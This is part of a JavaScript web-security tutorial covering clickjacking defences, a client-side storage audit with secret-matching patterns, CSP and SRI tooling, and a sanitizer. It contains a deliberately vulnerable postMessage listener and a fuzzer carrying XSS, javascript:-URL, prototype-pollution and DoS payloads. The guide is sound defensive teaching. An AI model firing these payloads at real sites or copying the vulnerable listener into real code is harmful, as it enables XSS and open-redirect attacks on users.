function detectClickjacking() {
    if (window.self !== window.top) {
        console.warn('Page is framed - potential clickjacking!');
        
        // Log framing domain
        try {
            const framingDomain = document.referrer;
            console.log('Framed by:', framingDomain);
        } catch (e) {
            console.log('Cross-origin framing detected');
        }
        
        // Alert security team
        fetch('/api/security/clickjacking-alert', {
            method: 'POST',
            body: JSON.stringify({
                url: location.href,
                referrer: document.referrer,
                timestamp: Date.now()
            })
        });
    }
}

// Frame busting script (defensive)
function frameBusting() {
    if (window.top !== window.self) {
        window.top.location = window.self.location;
    }
}

// More robust frame busting
function robustFrameBusting() {
    if (window.top !== window.self) {
        // Check if we can access top location
        try {
            if (window.top.location.hostname) {
                window.top.location = window.self.location;
            }
        } catch (e) {
            // Cross-origin framing - can't access location
            // Hide content or show warning
            document.body.innerHTML = '<h1>This page cannot be displayed in a frame</h1>';
        }
    }
}
```

### Client-Side Data Storage Vulnerabilities

**Insecure Storage Detection:**

```javascript
// Audit client-side storage for sensitive data
function auditClientStorage() {
    const findings = [];
    const sensitivePatterns = [
        /password/i,
        /secret/i,
        /token/i,
        /api[_-]?key/i,
        /session/i,
        /credential/i,
        /private[_-]?key/i,
        /ssn/i,
        /credit[_-]?card/i
    ];
    
    // Check localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        
        sensitivePatterns.forEach(pattern => {
            if (pattern.test(key) || pattern.test(value)) {
                findings.push({
                    storage: 'localStorage',
                    key: key,
                    matches: pattern.toString(),
                    risk: 'HIGH'
                });
            }
        });
    }
    
    // Check sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        
        sensitivePatterns.forEach(pattern => {
            if (pattern.test(key) || pattern.test(value)) {
                findings.push({
                    storage: 'sessionStorage',
                    key: key,
                    matches: pattern.toString(),
                    risk: 'MEDIUM'
                });
            }
        });
    }
    
    // Check IndexedDB
    if (window.indexedDB) {
        indexedDB.databases().then(databases => {
            databases.forEach(dbInfo => {
                const request = indexedDB.open(dbInfo.name);
                request.onsuccess = (event) => {
                    const db = event.target.result;
                    const objectStoreNames = db.objectStoreNames;
                    
                    // Check object store names
                    for (let name of objectStoreNames) {
                        sensitivePatterns.forEach(pattern => {
                            if (pattern.test(name)) {
                                findings.push({
                                    storage: 'IndexedDB',
                                    database: dbInfo.name,
                                    store: name,
                                    matches: pattern.toString(),
                                    risk: 'MEDIUM'
                                });
                            }
                        });
                    }
                };
            });
        });
    }
    
    console.table(findings);
    return findings;
}
```

**Secure Storage Implementation:**

```javascript
// Secure client-side storage wrapper
class SecureStorage {
    constructor(namespace = 'app') {
        this.namespace = namespace;
        this.prefix = `${namespace}:`;
    }
    
    // Never store sensitive data in plaintext
    async setEncrypted(key, value, password) {
        const encoder = new TextEncoder();
        const data = encoder.encode(JSON.stringify(value));
        
        // Generate key from password
        const keyMaterial = await crypto.subtle.importKey(
            'raw',
            encoder.encode(password),
            'PBKDF2',
            false,
            ['deriveKey']
        );
        
        const encryptionKey = await crypto.subtle.deriveKey(
            {
                name: 'PBKDF2',
                salt: encoder.encode(this.namespace),
                iterations: 100000,
                hash: 'SHA-256'
            },
            keyMaterial,
            { name: 'AES-GCM', length: 256 },
            false,
            ['encrypt']
        );
        
        const iv = crypto.getRandomValues(new Uint8Array(12));
        const encrypted = await crypto.subtle.encrypt(
            { name: 'AES-GCM', iv: iv },
            encryptionKey,
            data
        );
        
        // Store IV with encrypted data
        const stored = {
            iv: Array.from(iv),
            data: Array.from(new Uint8Array(encrypted))
        };
        
        localStorage.setItem(this.prefix + key, JSON.stringify(stored));
    }
    
    // Set non-sensitive data
    set(key, value) {
        localStorage.setItem(this.prefix + key, JSON.stringify({
            value: value,
            timestamp: Date.now()
        }));
    }
    
    get(key) {
        const stored = localStorage.getItem(this.prefix + key);
        if (!stored) return null;
        
        try {
            const parsed = JSON.parse(stored);
            return parsed.value;
        } catch (e) {
            return null;
        }
    }
    
    // Clear all data for this namespace
    clear() {
        const keysToRemove = [];
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key.startsWith(this.prefix)) {
                keysToRemove.push(key);
            }
        }
        keysToRemove.forEach(key => localStorage.removeItem(key));
    }
}
```

### PostMessage Vulnerabilities

Cross-origin communication via `postMessage` can be a significant security risk if not properly validated:

```javascript
// Vulnerable postMessage listener
window.addEventListener('message', (event) => {
    // VULNERABLE: No origin validation!
    const data = event.data;
    
    if (data.action === 'updateProfile') {
        document.getElementById('profile').innerHTML = data.content;  // XSS!
    }
    
    if (data.action === 'redirect') {
        location.href = data.url;  // Open redirect!
    }
});

// Secure postMessage listener
window.addEventListener('message', (event) => {
    // Validate origin
    const allowedOrigins = ['https://trusted-app.com', 'https://api.trusted.com'];
    
    if (!allowedOrigins.includes(event.origin)) {
        console.warn('Message from untrusted origin:', event.origin);
        return;
    }
    
    // Validate data structure
    if (!event.data || typeof event.data !== 'object') {
        return;
    }
    
    const data = event.data;
    
    // Validate action
    if (data.action === 'updateContent') {
        // Sanitize content
        const sanitized = DOMPurify.sanitize(data.content);
        document.getElementById('content').innerHTML = sanitized;
    }
    
    // Send acknowledgment
    event.source.postMessage({
        status: 'received',
        id: data.id
    }, event.origin);
});

// PostMessage fuzzer for testing
function fuzzPostMessage(targetWindow, targetOrigin) {
    const payloads = [
        // XSS payloads
        { action: 'render', content: '<img src=x onerror=alert(1)>' },
        { action: 'render', content: '<script>alert(1)</script>' },
        
        // Open redirect
        { action: 'navigate', url: 'javascript:alert(1)' },
        { action: 'navigate', url: 'data:text/html,<script>alert(1)</script>' },
        
        // DOM clobbering
        { action: 'config', config: { '__proto__': { 'admin': true } } },
        
        // Large data (DoS)
        { action: 'process', data: 'A'.repeat(1000000) },
        
        // Unexpected types
        { action: () => alert(1) },  // Function payload
        null,
        undefined,
        []
    ];
    
    payloads.forEach(payload => {
        targetWindow.postMessage(payload, targetOrigin);
    });
}
```

---

## Part 5: JavaScript Security Testing Tools and Frameworks

### Client-Side Security Testing Libraries

**DOM Invader (Burp Suite):**

DOM Invader is a powerful tool for finding DOM XSS. Here's how it works conceptually:

```javascript
// Simplified DOM Invader-like instrumentation
class DOMInvader {
    constructor() {
        this.sources = new Set();
        this.sinks = new Set();
        this.flows = [];
        this.instrument();
    }
    
    instrument() {
        // Instrument sources
        const originalLocation = window.location;
        Object.defineProperty(window, 'location', {
            get: () => {
                this.sources.add('window.location');
                return originalLocation;
            }
        });
        
        // Instrument sinks
        const originalInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
        Object.defineProperty(Element.prototype, 'innerHTML', {
            set: function(value) {
                originalInnerHTML.set.call(this, value);
                // Check if value contains canary
                if (value.includes('DOMINVADER_CANARY')) {
                    console.warn('DOM XSS detected: innerHTML with canary');
                }
            }
        });
    }
    
    // Taint tracking (simplified)
    taint(value, source) {
        if (typeof value === 'string') {
            return {
                value: value,
                __tainted: true,
                __source: source
            };
        }
        return value;
    }
    
    checkTainted(value) {
        return value && value.__tainted;
    }
}
```

**CSP Evaluator:**

```javascript
// CSP policy analyzer
function analyzeCSP(cspString) {
    const directives = {};
    const findings = [];
    
    // Parse CSP
    cspString.split(';').forEach(directive => {
        const [name, ...values] = directive.trim().split(/\s+/);
        if (name) {
            directives[name] = values.join(' ');
        }
    });
    
    // Check for unsafe directives
    if (directives['script-src']) {
        const scriptSrc = directives['script-src'];
        
        if (scriptSrc.includes('unsafe-inline')) {
            findings.push({
                severity: 'HIGH',
                issue: 'unsafe-inline allows inline scripts and event handlers',
                recommendation: 'Remove unsafe-inline and use nonces or hashes'
            });
        }
        
        if (scriptSrc.includes('unsafe-eval')) {
            findings.push({
                severity: 'HIGH',
                issue: 'unsafe-eval allows eval() and Function constructor',
                recommendation: 'Remove unsafe-eval unless absolutely necessary'
            });
        }
        
        if (scriptSrc.includes('*')) {
            findings.push({
                severity: 'HIGH',
                issue: 'Wildcard (*) allows scripts from any origin',
                recommendation: 'Specify exact origins instead of *'
            });
        }
        
        if (scriptSrc.includes('data:')) {
            findings.push({
                severity: 'MEDIUM',
                issue: 'data: URI allows script injection',
                recommendation: 'Remove data: from script-src'
            });
        }
    } else {
        findings.push({
            severity: 'CRITICAL',
            issue: 'Missing script-src directive',
            recommendation: 'Define a restrictive script-src'
        });
    }
    
    // Check for missing directives
    const recommendedDirectives = [
        'default-src',
        'script-src',
        'style-src',
        'img-src',
        'connect-src',
        'font-src',
        'object-src',
        'media-src',
        'frame-src',
        'frame-ancestors',
        'form-action',
        'base-uri'
    ];
    
    recommendedDirectives.forEach(dir => {
        if (!directives[dir]) {
            findings.push({
                severity: 'LOW',
                issue: `Missing ${dir} directive`,
                recommendation: `Consider adding ${dir} to restrict capabilities`
            });
        }
    });
    
    // Check frame-ancestors for clickjacking protection
    if (!directives['frame-ancestors']) {
        findings.push({
            severity: 'MEDIUM',
            issue: 'Missing frame-ancestors directive',
            recommendation: 'Add frame-ancestors \'none\' or \'self\' to prevent clickjacking'
        });
    }
    
    return {
        directives: directives,
        findings: findings,
        score: calculateCSPScore(findings)
    };
}

function calculateCSPScore(findings) {
    const severityWeights = {
        'CRITICAL': 25,
        'HIGH': 15,
        'MEDIUM': 5,
        'LOW': 1
    };
    
    let score = 100;
    findings.forEach(f => {
        score -= severityWeights[f.severity] || 0;
    });
    
    return Math.max(0, score);
}
```

### Browser Extensions for Security Testing

**Custom Security Testing Extension:**

```javascript
// manifest.json
{
    "manifest_version": 3,
    "name": "Security Tester",
    "version": "1.0",
    "permissions": [
        "storage",
        "webRequest",
        "scripting",
        "activeTab"
    ],
    "host_permissions": [
        "<all_urls>"
    ],
    "action": {
        "default_popup": "popup.html"
    },
    "content_scripts": [
        {
            "matches": ["<all_urls>"],
            "js": ["content.js"],
            "run_at": "document_start"
        }
    ],
    "background": {
        "service_worker": "background.js"
    }
}

// content.js - Injected into every page
class SecurityScanner {
    constructor() {
        this.findings = [];
        this.scan();
    }
    
    scan() {
        this.checkStorageAccess();
        this.checkCookies();
        this.checkEventListeners();
        this.checkIframes();
        this.reportFindings();
    }
    
    checkStorageAccess() {
        // Check if page accesses localStorage
        const originalGetItem = Storage.prototype.getItem;
        const originalSetItem = Storage.prototype.setItem;
        
        Storage.prototype.getItem = function(key) {
            console.log(`[Storage] getItem: ${key}`);
            return originalGetItem.call(this, key);
        };
        
        Storage.prototype.setItem = function(key, value) {
            console.log(`[Storage] setItem: ${key} = ${value.substring(0, 50)}...`);
            
            // Check for sensitive data
            if (key.match(/token|session|auth|password|secret/i)) {
                this.findings.push({
                    type: 'SENSITIVE_STORAGE',
                    key: key,
                    storage: this === localStorage ? 'localStorage' : 'sessionStorage'
                });
            }
            
            return originalSetItem.call(this, key, value);
        }.bind(this);
    }
    
    checkCookies() {
        // Check for insecure cookies
        const cookies = document.cookie.split(';');
        cookies.forEach(cookie => {
            if (cookie.includes('session') || cookie.includes('auth')) {
                if (!document.cookie.includes('Secure')) {
                    this.findings.push({
                        type: 'INSECURE_COOKIE',
                        issue: 'Missing Secure flag'
                    });
                }
                if (!document.cookie.includes('HttpOnly')) {
                    this.findings.push({
                        type: 'INSECURE_COOKIE',
                        issue: 'Missing HttpOnly flag'
                    });
                }
            }
        });
    }
    
    checkEventListeners() {
        // Override addEventListener to detect dangerous listeners
        const originalAddEventListener = EventTarget.prototype.addEventListener;
        
        EventTarget.prototype.addEventListener = function(type, listener, options) {
            if (type === 'message' && this === window) {
                console.log('[Security] postMessage listener registered');
                // Could analyze listener function for origin validation
            }
            
            return originalAddEventListener.call(this, type, listener, options);
        };
    }
    
    checkIframes() {
        const iframes = document.querySelectorAll('iframe');
        iframes.forEach(iframe => {
            if (!iframe.sandbox) {
                this.findings.push({
                    type: 'IFRAME',
                    issue: 'Missing sandbox attribute',
                    src: iframe.src
                });
            }
        });
    }
    
    reportFindings() {
        if (this.findings.length > 0) {
            chrome.runtime.sendMessage({
                type: 'SECURITY_FINDINGS',
                url: location.href,
                findings: this.findings
            });
        }
    }
}

// Initialize scanner
new SecurityScanner();
```

---

## Part 6: Defensive JavaScript Techniques

### Content Security Policy (CSP) Implementation

```javascript
// Generate CSP nonce
function generateNonce() {
    const array = new Uint8Array(16);
    crypto.getRandomValues(array);
    return btoa(String.fromCharCode(...array))
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=/g, '');
}

// Apply CSP meta tag
function applyCSP() {
    const nonce = generateNonce();
    
    const csp = [
        "default-src 'self'",
        `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
        "style-src 'self' 'unsafe-inline'",  // Consider nonce for styles too
        "img-src 'self' data: https:",
        "font-src 'self'",
        "connect-src 'self' https://api.trusted.com",
        "frame-ancestors 'none'",
        "form-action 'self'",
        "base-uri 'self'",
        "object-src 'none'",
        "upgrade-insecure-requests"
    ].join('; ');
    
    const meta = document.createElement('meta');
    meta.httpEquiv = 'Content-Security-Policy';
    meta.content = csp;
    document.head.appendChild(meta);
    
    // Apply nonce to existing scripts
    document.querySelectorAll('script:not([nonce])').forEach(script => {
        if (!script.src) {
            script.setAttribute('nonce', nonce);
        }
    });
    
    return nonce;
}
```

### Subresource Integrity (SRI)

```javascript
// Generate SRI hash for external resources
async function generateSRI(url) {
    const response = await fetch(url);
    const buffer = await response.arrayBuffer();
    const hashBuffer = await crypto.subtle.digest('SHA-384', buffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashBase64 = btoa(String.fromCharCode(...hashArray));
    
    return `sha384-${hashBase64}`;
}

// Validate SRI for script elements
function validateSRI() {
    const scripts = document.querySelectorAll('script[integrity]');
    
    scripts.forEach(async (script) => {
        const integrity = script.getAttribute('integrity');
        const [algorithm, expectedHash] = integrity.split('-');
        
        // Fetch and verify script content
        const response = await fetch(script.src);
        const content = await response.text();
        
        const hashBuffer = await crypto.subtle.digest(
            algorithm.toUpperCase(),
            new TextEncoder().encode(content)
        );
        
        const actualHash = btoa(String.fromCharCode(...new Uint8Array(hashBuffer)));
        
        if (actualHash !== expectedHash) {
            console.error(`SRI validation failed for ${script.src}`);
            // Remove compromised script
            script.remove();
        }
    });
}
```

### Input Sanitization Library

```javascript
// Lightweight XSS sanitizer (use DOMPurify in production!)
class Sanitizer {
    static html(html) {
        const div = document.createElement('div');
        div.textContent = html;  // Text content is safe
        return div.innerHTML;
    }
    
    static url(url) {
        // Only allow http, https, and relative URLs
        const allowedProtocols = ['http:', 'https:', ''];
        
        try {
            const parsed = new URL(url, location.origin);
            if (allowedProtocols.includes(parsed.protocol)) {
                return url;
            }
        } catch (e) {
            // Not a valid URL
        }
        
        return '#';
    }
    
    static attribute(value) {
        // Escape HTML entities in attributes
        return value
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;')
            .replace(/\//g, '&#x2F;');
    }
    
    static javascript(value) {
        // JSON encode for JavaScript context
        return JSON.stringify(value).slice(1, -1);
    }
    
    static css(value) {
        // Basic CSS sanitization
        return value.replace(/[<>'"]/g, '');
    }
}
```

---

## Conclusion: JavaScript as a Security Professional's Essential Tool

JavaScript's role in security is paradoxical yet essential. It is simultaneously the most dangerous client-side attack surface and the most powerful tool for testing and securing web applications. The security professional who masters JavaScript gains the ability to:

**Find Vulnerabilities**: From DOM-based XSS to prototype pollution to postMessage misconfigurations, JavaScript knowledge enables you to identify flaws that automated scanners miss. You can trace data flow from sources to sinks, understand the context in which vulnerabilities occur, and craft precise exploits that demonstrate real risk.

**Exploit and Validate**: Understanding JavaScript allows you to move beyond running canned payloads. You can bypass filters, chain vulnerabilities, and demonstrate sophisticated attack scenarios that convince stakeholders of the need for remediation.

**Build Defenses**: JavaScript expertise enables you to implement robust client-side security controls—CSP, SRI, secure storage patterns, input sanitization—that protect users even when server-side defenses fail.

**Automate Testing**: With browser automation frameworks and custom scripts, you can scale security testing across thousands of endpoints, continuously monitor for regressions, and integrate security into development pipelines.

The web continues to evolve toward richer, more JavaScript-heavy architectures. Single-page applications, progressive web apps, and serverless frontends push more logic and more risk to the client. In this landscape, JavaScript literacy is not optional for security professionals—it is fundamental.

Invest in understanding JavaScript's quirks, its security model, and its ecosystem. Practice writing exploits and defenses. Build testing tools and browser extensions. The time spent mastering JavaScript will pay dividends throughout your security career, enabling you to protect applications at the layer where users—and attackers—actually interact with them.

---

## Further Reading and Resources

**Books:**
- *The Web Application Hacker's Handbook* by Dafydd Stuttard and Marcus Pinto
- *JavaScript: The Good Parts* by Douglas Crockford
- *Secrets of the JavaScript Ninja* by John Resig and Bear Bibeault
- *Web Security for Developers* by Malcolm McDonald

**Online Resources:**
- **OWASP Cheat Sheet Series**: cheatsheetseries.owasp.org
- **PortSwigger Web Security Academy**: portswigger.net/web-security
- **Google Web Fundamentals Security**: developers.google.com/web/fundamentals/security
- **MDN Web Docs Security**: developer.mozilla.org/en-US/docs/Web/Security

**Essential Tools:**
- **DOMPurify**: github.com/cure53/DOMPurify
- **Puppeteer**: pptr.dev
- **Playwright**: playwright.dev
- **Burp Suite DOM Invader**: portswigger.net/burp/documentation/desktop/tools/dom-invader

**Practice Labs:**
- **XSS Game**: xss-game.appspot.com
- **alert(1) to win**: alf.nu/alert1
- **Prompt(1) to win**: prompt.ml
- **DOM XSS Test Cases**: github.com/cure53/DOMPurify/tree/main/demos
